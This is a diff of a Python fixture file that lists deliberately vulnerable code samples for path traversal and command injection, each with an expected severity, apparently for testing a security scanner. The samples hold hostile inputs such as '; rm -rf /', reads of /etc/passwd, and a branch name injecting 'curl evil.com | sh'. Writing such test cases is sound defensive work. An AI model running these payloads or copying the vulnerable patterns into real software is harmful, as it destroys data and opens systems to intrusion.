@@ -58,7 +58,7 @@ def cwe22_patterns() -> list[VulnerablePattern]:
         VulnerablePattern(
             cwe_id="CWE-22",
             pattern_id="PT-001",
-            code=r'''
+            code=r"""
 # VULNERABLE: CWE-22 startswith without path normalization
 # EXPECTED: CRITICAL - Path traversal via .. sequences
 # SOURCE: PR #752 (Python equivalent)
@@ -66,7 +66,7 @@ output_file = "../../../etc/passwd"
 if not output_file.startswith(memories_dir):
     print(f"Warning: Output file should be in {memories_dir}")
 # WARNING ONLY - attack succeeds
-''',
+""",
             description="startswith without realpath allows directory escape",
             expected_severity="CRITICAL",
             source="PR #752",
@@ -74,7 +74,7 @@ if not output_file.startswith(memories_dir):
         VulnerablePattern(
             cwe_id="CWE-22",
             pattern_id="PT-002",
-            code=r'''
+            code=r"""
 # VULNERABLE: CWE-22 os.path.join with absolute path bypass
 # EXPECTED: HIGH - os.path.join ignores base when child is absolute
 # SOURCE: Synthetic
@@ -82,7 +82,7 @@ user_input = "/etc/passwd"
 safe_dir = "/app/data"
 full_path = os.path.join(safe_dir, user_input)
 # full_path is now /etc/passwd, not under safe_dir
-''',
+""",
             description="os.path.join ignores base directory for absolute paths",
             expected_severity="HIGH",
             source="Synthetic",
@@ -90,7 +90,7 @@ full_path = os.path.join(safe_dir, user_input)
         VulnerablePattern(
             cwe_id="CWE-22",
             pattern_id="PT-003",
-            code=r'''
+            code=r"""
 # VULNERABLE: CWE-22 Symlink bypass
 # EXPECTED: HIGH - TOCTOU race with symlink
 # SOURCE: Synthetic
@@ -99,7 +99,7 @@ if os.path.isfile(path):
     # Attacker replaces file with symlink here
     with open(path) as f:  # Follows symlink to arbitrary file
         content = f.read()
-''',
+""",
             description="Symlink created between check and use",
             expected_severity="HIGH",
             source="Synthetic",
@@ -107,7 +107,7 @@ if os.path.isfile(path):
         VulnerablePattern(
             cwe_id="CWE-22",
             pattern_id="PT-004",
-            code=r'''
+            code=r"""
 # VULNERABLE: CWE-22 Null byte injection
 # EXPECTED: CRITICAL - Null byte truncates path validation
 # SOURCE: Synthetic
@@ -117,7 +117,7 @@ if extension == ".txt":
     # Passes validation but \x00 truncates in some APIs
     with open(user_input) as f:
         content = f.read()
-''',
+""",
             description="Null byte truncates path in validation",
             expected_severity="CRITICAL",
             source="Synthetic",
@@ -125,7 +125,7 @@ if extension == ".txt":
         VulnerablePattern(
             cwe_id="CWE-22",
             pattern_id="PT-005",
-            code=r'''
+            code=r"""
 # SAFE: Proper path validation with realpath
 # EXPECTED: PASS - This should NOT be flagged
 # SOURCE: GitHubCore.psm1 Test-SafeFilePath (Python equivalent)
@@ -133,7 +133,7 @@ def test_safe_file_path(path: str, allowed_root: str) -> bool:
     normalized_path = os.path.realpath(path)
     normalized_root = os.path.realpath(allowed_root)
     return normalized_path.startswith(normalized_root + os.sep)
-''',
+""",
             description="Correct path validation pattern",
             expected_severity="PASS",
             source="GitHubCore.psm1",
@@ -149,7 +149,7 @@ def cwe77_patterns() -> list[VulnerablePattern]:
         VulnerablePattern(
             cwe_id="CWE-77",
             pattern_id="CI-001",
-            code=r'''
+            code=r"""
 # VULNERABLE: CWE-77 shell=True with user input
 # EXPECTED: CRITICAL - Shell metacharacters can inject commands
 # SOURCE: PR #752 (Python equivalent)
@@ -157,7 +157,7 @@ query = "; rm -rf /"  # User input
 cmd = f"npx tsx {plugin_script} {query} {output_file}"
 subprocess.run(cmd, shell=True)
 # Runs TWO commands: npx tsx ... AND rm -rf /
-''',
+""",
             description="shell=True with user input allows shell metacharacter injection",
             expected_severity="CRITICAL",
             source="PR #752",
@@ -165,13 +165,13 @@ subprocess.run(cmd, shell=True)
         VulnerablePattern(
             cwe_id="CWE-77",
             pattern_id="CI-002",
-            code=r'''
+            code=r"""
 # VULNERABLE: CWE-77/CWE-94 dynamic code with user input
 # EXPECTED: CRITICAL - Arbitrary code execution
 # SOURCE: Synthetic
 user_command = input("Enter command: ")
 # Vulnerable: runs arbitrary Python code from user input
-''',
+""",
             description="Dynamic code running arbitrary user code",
             expected_severity="CRITICAL",
             source="Synthetic",
@@ -179,14 +179,14 @@ user_command = input("Enter command: ")
         VulnerablePattern(
             cwe_id="CWE-77",
             pattern_id="CI-003",
-            code=r'''
+            code=r"""
 # VULNERABLE: CWE-94 dynamic code with config value
 # EXPECTED: HIGH - Code injection via configuration
 # SOURCE: Synthetic
 config = json.load(open("config.json"))
 template = config["template"]
 # Vulnerable: Template can contain dangerous code
-''',
+""",
             description="Dynamic code allows code injection via config",
             expected_severity="HIGH",
             source="Synthetic",
@@ -194,14 +194,14 @@ template = config["template"]
         VulnerablePattern(
             cwe_id="CWE-77",
             pattern_id="CI-004",
-            code=r'''
+            code=r"""
 # VULNERABLE: CWE-77 Shell metacharacters in git command
 # EXPECTED: CRITICAL - Command chaining
 # SOURCE: Synthetic
 branch_name = os.environ.get("BRANCH_NAME")  # User-controlled
 subprocess.run(f"git checkout {branch_name}", shell=True)
 # If BRANCH_NAME = "main; curl evil.com | sh" -> runs malicious code
-''',
+""",
             description="subprocess with shell=True and environment variable",
             expected_severity="CRITICAL",
             source="Synthetic",
@@ -209,14 +209,14 @@ subprocess.run(f"git checkout {branch_name}", shell=True)
         VulnerablePattern(
             cwe_id="CWE-77",
             pattern_id="CI-005",
-            code=r'''
+            code=r"""
 # SAFE: List arguments prevent injection
 # EXPECTED: PASS - This should NOT be flagged
 # SOURCE: Safe pattern
 query = "; rm -rf /"  # User input (malicious)
 subprocess.run(["npx", "tsx", plugin_script, query, output_file], check=True)
 # List arguments prevent metacharacter interpretation
-''',
+""",
             description="List arguments prevent injection",
             expected_severity="PASS",
             source="Safe pattern",
